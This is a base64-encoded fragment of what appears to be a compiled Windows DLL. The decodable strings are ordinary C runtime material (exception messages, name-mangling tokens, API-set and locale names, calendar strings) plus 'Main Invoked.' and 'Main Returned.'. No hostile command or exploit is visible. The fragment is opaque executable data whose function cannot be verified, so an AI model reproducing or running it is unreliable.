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aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgALQAAACsAAAAmAAAALT4qAC8AAAAlAAAAPAAAADw9AAA+AAAAPj0AACwAAAAoKQAAfgAAAF4AAAB8AAAAJiYAAHx8AAAqPQAAKz0AAC09AAAvPQAAJT0AAD4+PQA8PD0AJj0AAHw9AABePQAAYHZmdGFibGUnAAAAAAAAAGB2YnRhYmxlJwAAAAAAAABgdmNhbGwnAGB0eXBlb2YnAAAAAAAAAABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgc3RyaW5nJwAAAAAAAAAAYHZiYXNlIGRlc3RydWN0b3InAAAAAAAAYHZlY3RvciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAAAAAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAAAAAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAAAAAACBkZWxldGVbXQAAAAAAAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAAAAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAA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AQAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBhAHAAcABtAG8AZABlAGwALQByAHUAbgB0AGkAbQBlAC0AbAAxAC0AMQAtADEAAAAAAAAAAAAAAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBkAGEAdABlAHQAaQBtAGUALQBsADEALQAxAC0AMQAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AZgBpAGwAZQAtAGwAMgAtADEALQAxAAAAAAAAAAAAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAGwAbwBjAGEAbABpAHoAYQB0AGkAbwBuAC0AbAAxAC0AMgAtADEAAAAAAAAAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AbABvAGMAYQBsAGkAegBhAHQAaQBvAG4ALQBvAGIAcwBvAGwAZQB0AGUALQBsADEALQAyAC0AMAAAAAAAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AcAByAG8AYwBlAHMAcwB0AGgAcgBlAGEAZABzAC0AbAAxAC0AMQAtADIAAAAAAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBzAHQAcgBpAG4AZwAtAGwAMQAtADEALQAwAAAAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AcwB5AHMAaQBuAGYAbwAtAGwAMQAtADIALQAxAAAAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAHcAaQBuAHIAdAAtAGwAMQAtADEALQAwAAAAAAAAAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQB4AHMAdABhAHQAZQAtAGwAMgAtADEALQAwAAAAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQByAHQAYwBvAHIAZQAtAG4AdAB1AHMAZQByAC0AdwBpAG4AZABvAHcALQBsADEALQAxAC0AMAAAAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAHMAZQBjAHUAcgBpAHQAeQAtAHMAeQBzAHQAZQBtAGYAdQBuAGMAdABpAG8AbgBzAC0AbAAxAC0AMQAtADAAAAAAAAAAAAAAAAAAZQB4AHQALQBtAHMALQB3AGkAbgAtAGsAZQByAG4AZQBsADMAMgAtAHAAYQBjAGsAYQBnAGUALQBjAHUAcgByAGUAbgB0AC0AbAAxAC0AMQAtADAAAAAAAAAAAAAAAAAAZQB4AHQALQBtAHMALQB3AGkAbgAtAG4AdAB1AHMAZQByAC0AZABpAGEAbABvAGcAYgBvAHgALQBsADEALQAxAC0AMAAAAAAAAAAAAAAAAABlAHgAdAAtAG0AcwAtAHcAaQBuAC0AbgB0AHUAcwBlAHIALQB3AGkAbgBkAG8AdwBzAHQAYQB0AGkAbwBuAC0AbAAxAC0AMQAtADAAAAAAAHUAcwBlAHIAMwAyAAAAAAACAAAAEgAAAAIAAAASAAAAAgAAABIAAAACAAAAEgAAAAAAAAAOAAAAR2V0Q3VycmVudFBhY2thZ2VJZAAAAAAACAAAABIAAAAEAAAAEgAAAExDTWFwU3RyaW5nRXgAAAAEAAAAEgAAAExvY2FsZU5hbWVUb0xDSUQAAAAASU5GAGluZgBOQU4AbmFuAAAAAABOQU4oU05BTikAAAAAAAAAbmFuKHNuYW4pAAAAAAAAAE5BTihJTkQpAAAAAAAAAABuYW4oaW5kKQAAAABlKzAwMAAAAAAAAAAAAAAAAAAAABBdAYABAAAAFF0BgAEAAAAYXQGAAQAAABxdAYABAAAAIF0BgAEAAAAkXQGAAQAAAChdAYABAAAALF0BgAEAAAA0XQGAAQAAAEBdAYABAAAASF0BgAEAAABYXQGAAQAAAGRdAYABAAAAcF0BgAEAAAB8XQGAAQAAAIBdAYABAAAAhF0BgAEAAACIXQGAAQAAAIxdAYABAAAAkF0BgAEAAACUXQGAAQAAAJhdAYABAAAAnF0BgAEAAACgXQGAAQAAAKRdAYABAAAAqF0BgAEAAACwXQGAAQAAALhdAYABAAAAxF0BgAEAAADMXQGAAQAAAIxdAYABAAAA1F0BgAEAAADcXQGAAQAAAORdAYABAAAA8F0BgAEAAAAAXgGAAQAAAAheAYABAAAAGF4BgAEAAAAkXgGAAQAAACheAYABAAAAMF4BgAEAAABAXgGAAQAAAFheAYABAAAAAQAAAAAAAABoXgGAAQAAAHBeAYABAAAAeF4BgAEAAACAXgGAAQAAAIheAYABAAAAkF4BgAEAAACYXgGAAQAAAKBeAYABAAAAsF4BgAEAAADAXgGAAQAAANBeAYABAAAA6F4BgAEAAAAAXwGAAQAAABBfAYABAAAAKF8BgAEAAAAwXwGAAQAAADhfAYABAAAAQF8BgAEAAABIXwGAAQAAAFBfAYABAAAAWF8BgAEAAABgXwGAAQAAAGhfAYABAAAAcF8BgAEAAAB4XwGAAQAAAIBfAYABAAAAiF8BgAEAAACYXwGAAQAAALBfAYABAAAAwF8BgAEAAABIXwGAAQAAANBfAYABAAAA4F8BgAEAAADwXwGAAQAAAABgAYABAAAAGGABgAEAAAAoYAGAAQAAAEBgAYABAAAAVGABgAEAAABcYAGAAQAAAGhgAYABAAAAgGABgAEAAACoYAGAAQAAAMBgAYABAAAAU3VuAE1vbgBUdWUAV2VkAFRodQBGcmkAU2F0AFN1bmRheQAATW9uZGF5AAAAAAAAVHVlc2RheQBXZWRuZXNkYXkAAAAAAAAAVGh1cnNkYXkAAAAARnJpZGF5AAAAAAAAU2F0dXJkYXkAAAAASmFuAEZlYgBNYXIAQXByAE1heQBKdW4ASnVsAEF1ZwBTZXAAT2N0AE5vdgBEZWMAAAAAAEphbnVhcnkARmVicnVhcnkAAAAATWFyY2gAAABBcHJpbAAAAEp1bmUAAAAASnVseQAAAABBdWd1c3QAAAAAAABTZXB0ZW1iZXIAAAAAAAAAT2N0b2JlcgBOb3ZlbWJlcgAAAAAAAAAARGVjZW1iZXIAAAAAQU0AAFBNAAAAAAAATU0vZGQveXkAAAAAAAAAAGRkZGQsIE1NTU0gZGQsIHl5eXkAAAAAAEhIOm1tOnNzAAAAAAAAAABTAHUAbgAAAE0AbwBuAAAAVAB1AGUAAABXAGUAZAAAAFQAaAB1AAAARgByAGkAAABTAGEAdAAAAFMAdQBuAGQAYQB5AAAAAABNAG8AbgBkAGEAeQAAAAAAVAB1AGUAcwBkAGEAeQAAAFcAZQBkAG4AZQBzAGQAYQB5AAAAAAAAAFQAaAB1AHIAcwBkAGEAeQAAAAAAAAAAAEYAcgBpAGQAYQB5AAAAAABTAGEAdAB1AHIAZABhAHkAAAAAAAAAAABKAGEAbgAAAEYAZQBiAAAATQBhAHIAAABBAHAAcgAAAE0AYQB5AAAASgB1AG4AAABKAHUAbAAAAEEAdQBnAAAAUwBlAHAAAABPAGMAdAAAAE4AbwB2AAAARABlAGMAAABKAGEAbgB1AGEAcgB5AAAARgBlAGIAcgB1AGEAcgB5AAAAAAAAAAAATQBhAHIAYwBoAAAAAAAAAEEAcAByAGkAbAAAAAAAAABKAHUAbgBlAAAAAAAAAAAASgB1AGwAeQAAAAAAAAAAAEEAdQBnAHUAcwB0AAAAAABTAGUAcAB0AGUAbQBiAGUAcgAAAAAAAABPAGMAdABvAGIAZQByAAAATgBvAHYAZQBtAGIAZQByAAAAAAAAAAAARABlAGMAZQBtAGIAZQByAAAAAABBAE0AAAAAAFAATQAAAAAAAAAAAE0ATQAvAGQAZAAvAHkAeQAAAAAAAAAAAGQAZABkAGQALAAgAE0ATQBNAE0AIABkAGQALAAgAHkAeQB5AHkAAABIAEgAOgBtAG0AOgBzAHMAAAAAAAAAAABlAG4ALQBVAFMAAAAAAAAA8GABgAEAAAAAYQGAAQAAABBhAYABAAAAIGEBgAEAAABqAGEALQBKAFAAAAAAAAAAegBoAC0AQwBOAAAAAAAAAGsAbwAtAEsAUgAAAAAAAAB6AGgALQBUAFcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAIEAgQCBAIEAgQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAEAAQABAAEAAQABAAggCCAIIAggCCAIIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACABAAEAAQABAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQGBAYEBgQGBAYEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBARAAEAAQABAAEAAQAIIBggGCAYIBggGCAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgEQABAAEAAQACAAIAAgACAAIAAgACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAgAEAAQABAAEAAQABAAEAAQABAAEgEQABAAMAAQABAAEAAQABQAFAAQABIBEAAQABAAFAASARAAEAAQABAAEAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAABAQEBAQEBAQEBAQEBAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAAgECAQIBAgECAQIBAgECAQEBAAAAAAAAAAAAAAAAAQAAAAAAAACAdwGAAQAAAAIAAAAAAAAAiHcBgAEAAAADAAAAAAAAAJB3AYABAAAABAAAAAAAAACYdwGAAQAAAAUAAAAAAAAAqHcBgAEAAAAGAAAAAAAAALB3AYABAAAABwAAAAAAAAC4dwGAAQAAAAgAAAAAAAAAwHcBgAEAAAAJAAAAAAAAAMh3AYABAAAACgAAAAAAAADQdwGAAQAAAAsAAAAAAAAA2HcBgAEAAAAMAAAAAAAAAOB3AYABAAAADQAAAAAAAADodwGAAQAAAA4AAAAAAAAA8HcBgAEAAAAPAAAAAAAAAPh3AYABAAAAEAAAAAAAAAAAeAGAAQAAABEAAAAAAAAACHgBgAEAAAASAAAAAAAAABB4AYABAAAAEwAAAAAAAAAYeAGAAQAAABQAAAAAAAAAIHgBgAEAAAAVAAAAAAAAACh4AYABAAA